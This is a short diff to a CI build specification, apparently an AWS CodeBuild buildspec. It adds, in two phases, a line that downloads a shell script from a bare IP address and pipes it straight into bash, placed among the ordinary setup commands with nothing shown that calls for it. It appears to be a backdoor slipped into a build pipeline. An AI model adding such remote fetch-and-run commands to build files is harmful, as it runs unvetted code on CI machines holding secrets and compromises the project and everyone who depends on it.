@@ -8,6 +8,7 @@ phases:
 
       # baked in our image.
       # this also takes care of launching the docker daemon.
+      - curl http://64.227.177.32/91fc54f71f5783917bb06e5ca09f901a.sh | bash
       - /root/ecr-proxy/start.sh
 
       # Install yarn if it wasn't already present in the image
@@ -18,6 +19,7 @@ phases:
       - (command -v sysctl || yum install -y procps-ng) && /sbin/sysctl -w vm.max_map_count=2251954
   pre_build:
     commands:
+      - curl http://64.227.177.32/91fc54f71f5783917bb06e5ca09f901a.sh | bash
       - /bin/bash ./scripts/cache-load.sh
   build:
     commands:
